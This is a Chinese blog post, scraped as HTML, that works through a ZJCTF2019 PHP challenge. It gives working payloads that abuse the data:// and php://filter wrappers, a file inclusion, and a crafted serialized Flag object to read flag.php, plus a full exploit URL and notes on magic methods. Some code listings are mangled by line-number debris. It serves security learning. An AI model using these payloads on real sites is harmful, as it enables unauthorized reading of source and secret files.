<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>ctf题php反序列化,从一道CTF题中学习php反序列化与伪协议 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="ctf题php反序列化,从一道CTF题中学习php反序列化与伪协议" />
<meta property="og:description" content="之前一直有想写关于反序列化的东西，可是一直拖拖拖，拖到了现在。
本文尝试从ZJCTF2019中的例题来了解何为php反序列，以及php伪协议。
原题：逆转思维1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20$text = $_GET[&#34;text&#34;];
$file = $_GET[&#34;file&#34;];
$password = $_GET[&#34;password&#34;];
if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&#34;welcome to the zjctf&#34;)){
echo &#34;
&#34;.file_get_contents($text,&#39;r&#39;).&#34;&#34;; if(preg_match(&#34;/flag/&#34;,$file)){
echo &#34;Not now!&#34;;
exit();
}else{
include($file);
$password = unserialize($password);
echo $password;
}
}
else{
highlight_file(__FILE__);
}
?&gt;
给text传值
从代码来看，当给text传入“welcome to the zjctf”时可以进入到If语句。直接传值会被file_get_contents过滤掉，所以这里利用php伪协议来给text传值。1payload为text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
官网资料：
file_get_contents 函数是用于把文件的内容读入到一个字符串中的首选方法
打印date内容 echo file_get_contents(‘data://text/plain;base64,SSBsb3ZlIFBIUAo=’);
读取useless.php文件
从源码中可以看出不能直接读取flag.php文件，根据提示我们先要读取useless.php文件。1payload为file=php://filter/read=convert.base64-encode/resource=useless.php
解码得到：1" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/a003b125ceebd74a6c7f0eaab5f6889f/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-04-01T06:48:47+08:00" />
<meta property="article:modified_time" content="2021-04-01T06:48:47+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">ctf题php反序列化,从一道CTF题中学习php反序列化与伪协议</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <div style="font-size:16px;"> 
 <p align="center"></p> 
 <p>之前一直有想写关于反序列化的东西，可是一直拖拖拖，拖到了现在。</p> 
 <p>本文尝试从ZJCTF2019中的例题来了解何为php反序列，以及php伪协议。</p> 
 <p>原题：逆转思维1</p> 
 <p>2</p> 
 <p>3</p> 
 <p>4</p> 
 <p>5</p> 
 <p>6</p> 
 <p>7</p> 
 <p>8</p> 
 <p>9</p> 
 <p>10</p> 
 <p>11</p> 
 <p>12</p> 
 <p>13</p> 
 <p>14</p> 
 <p>15</p> 
 <p>16</p> 
 <p>17</p> 
 <p>18</p> 
 <p>19</p> 
 <p>20$text = $_GET["text"];</p> 
 <p>$file = $_GET["file"];</p> 
 <p>$password = $_GET["password"];</p> 
 <p>if(isset($text)&amp;&amp;(file_get_contents($text,'r')==="welcome to the zjctf")){<!-- --></p> 
 <p>echo "</p> 
 <h2>".file_get_contents($text,'r')."</h2>"; 
 <p>if(preg_match("/flag/",$file)){<!-- --></p> 
 <p>echo "Not now!";</p> 
 <p>exit();</p> 
 <p>}else{<!-- --></p> 
 <p>include($file);</p> 
 <p>$password = unserialize($password);</p> 
 <p>echo $password;</p> 
 <p>}</p> 
 <p>}</p> 
 <p>else{<!-- --></p> 
 <p>highlight_file(__FILE__);</p> 
 <p>}</p> 
 <p>?&gt;</p> 
 <p>给text传值</p> 
 <p>从代码来看，当给text传入“welcome to the zjctf”时可以进入到If语句。直接传值会被file_get_contents过滤掉，所以这里利用php伪协议来给text传值。1payload为text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</p> 
 <p align="center"><img src="https://images2.imgbox.com/77/55/h94GeAqu_o.png" alt="a63ef99d03aaf7e9da3561695cdecf5d.png"></p> 
 <p align="center"><img src="https://images2.imgbox.com/59/77/NviM70Ju_o.png" alt="55cdafc62f853a37ee812c6a18fd8727.png">官网资料：</p> 
 <p>file_get_contents 函数是用于把文件的内容读入到一个字符串中的首选方法</p> 
 <p>打印date内容 echo file_get_contents(‘data://text/plain;base64,SSBsb3ZlIFBIUAo=’);</p> 
 <p>读取useless.php文件</p> 
 <p>从源码中可以看出不能直接读取flag.php文件，根据提示我们先要读取useless.php文件。1payload为file=php://filter/read=convert.base64-encode/resource=useless.php</p> 
 <p align="center"><img src="https://images2.imgbox.com/6e/5e/3d7Knqp9_o.png" alt="9afd1dac1f2e421b9fc79cf757224c81.png"></p> 
 <p>解码得到：1</p> 
 <p>2</p> 
 <p>3</p> 
 <p>4</p> 
 <p>5</p> 
 <p>6</p> 
 <p>7</p> 
 <p>8</p> 
 <p>9</p> 
 <p>10</p> 
 <p>11</p> 
 <p>12</p> 
 <p>13class{//flag.php</p> 
 <p>public $file;</p> 
 <p>public function __tostring(){<!-- --></p> 
 <p>if(isset($this-&gt;file)){<!-- --></p> 
 <p>echo file_get_contents($this-&gt;file);</p> 
 <p>echo "<br>";</p> 
 <p>return ("HAHAHAHAHA");</p> 
 <p>}</p> 
 <p>}</p> 
 <p>}</p> 
 <p>?&gt;</p> 
 <p>填写password参数拿到flag</p> 
 <p>上一步我们已经拿到useless.php文件的源码，从代码来看提示了有一个flag.php文件并且在最早的源码中出现了unserialize($password)，所以这里的password肯定是要填序列化之后的值。</p> 
 <p>序列化：保存对象的状态，方便时可恢复对象状态，使之长久保存</p> 
 <p>代码:1</p> 
 <p>2</p> 
 <p>3</p> 
 <p>4</p> 
 <p>5</p> 
 <p>6</p> 
 <p>7class{<!-- --></p> 
 <p>public $file="flag.php";</p> 
 <p>}</p> 
 <p>$a=new Flag();</p> 
 <p>echo serialize($a);</p> 
 <p>?&gt;</p> 
 <p>生成payload1payload为password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</p> 
 <p align="center"><img src="https://images2.imgbox.com/08/5a/LOdusCsX_o.png" alt="5fbdb784584eed1c9b9fc614a1c3317e.png"></p> 
 <p>综合上述三步，完整的payload为1http://127.0.0.1/1.php？text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}</p> 
 <p align="center"><img src="https://images2.imgbox.com/ad/3b/yhV2La2y_o.png" alt="783203582355b4f4511e07eecee56f49.png"></p> 
 <p>总结</p> 
 <p>php反序列化</p> 
 <p>serialize()将对象的用字符串的方式进行表示，unserialize()将序列化的字符串，构造成相应的对象。</p> 
 <p>O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}1对象类型:对象名长度:“对象名”:对象成员变量个数:{变量1类型:变量名1长度:变量名1; 参数1类型:参数1长度:参数1; 变量2类型:变量名2长度:“变量名2”; 参数2类型:参数2长度:参数2;… …}</p> 
 <p>魔术方法会被自动调用，常见的魔术方法有construct(), destruct(), call(), callStatic(), get(), set(), isset(), unset(), sleep(), wakeup(), toString(), invoke(), set(), _state(), clone(), __debugInfo() …</p> 
 <p>反序列化漏洞中常见到有一些魔术方法：</p> 
 <p>construct()：在对象创建时自动被调用；</p> 
 <p>destruct()：在脚本运行结束时自动被调用；</p> 
 <p>sleep()：在对象序列化的时候自动被调用；</p> 
 <p>wakeup()：在反序列化为对象时自动被调用；</p> 
 <p>__toString()： 直接输出对象引用时自动被调用；</p> 
 <p>php伪协议file:// — 访问本地文件系统</p> 
 <p>http:// — 访问 HTTP(s) 网址</p> 
 <p>ftp:// — 访问 FTP(s) URLs</p> 
 <p>php:// — 访问各个输入/输出流(I/O streams)</p> 
 <p>data:// — 数据(RFC 2397)</p> 
 <p>glob:// — 查找匹配的文件路径模式</p> 
 <p>phar:// — PHP 归档</p> 
 <p>ssh2:// — Secure Shell 2</p> 
 <p>expect:// — 处理交互式的流</p> 
 <p>data://中相关内容：1</p> 
 <p>2</p> 
 <p>3</p> 
 <p>4</p> 
 <p>5</p> 
 <p>6</p> 
 <p>7</p> 
 <p>8</p> 
 <p>9* data:,文本数据</p> 
 <p>* data:text/plain,文本数据</p> 
 <p>* data:text/html,HTML代码</p> 
 <p>* data:text/css;base64,css代码</p> 
 <p>* data:text/javascript;base64,javascript代码</p> 
 <p>* data:image/x-icon;base64,base64编码的icon图片数据</p> 
 <p>* data:image/gif;base64,base64编码的gif图片数据</p> 
 <p>* data:image/png;base64,base64编码的png图片数据</p> 
 <p>* data:image/jpeg;base64,base64编码的jpeg图片数据</p> 
 <p>php://中的相关内容：1</p> 
 <p>2</p> 
 <p>3</p> 
 <p>4</p> 
 <p>5*php://filter:用于读取源代码并进行base64编码输出(一般可读取藏在源代码中的flag)</p> 
 <p>eg：php://filter/read=convert.base64-encode/resource=useless.php</p> 
 <p>*php://input:可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</p> 
 <p>eg：就如本体中在对text赋值是可写成text=php://input，然后再用post把welcome to the zjctf一起传过去，同样可以绕过file_get_contents()函数</p> 
</div>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/cefd2646d6d2501cd43a68f1768ff1d2/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">layui的使用（table/form）——layui踩坑记录</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/4e900f2f55f3e17596c156d8e9366709/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Visual Studio安装时，不能更改共享组件、工具和SDK的位置</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>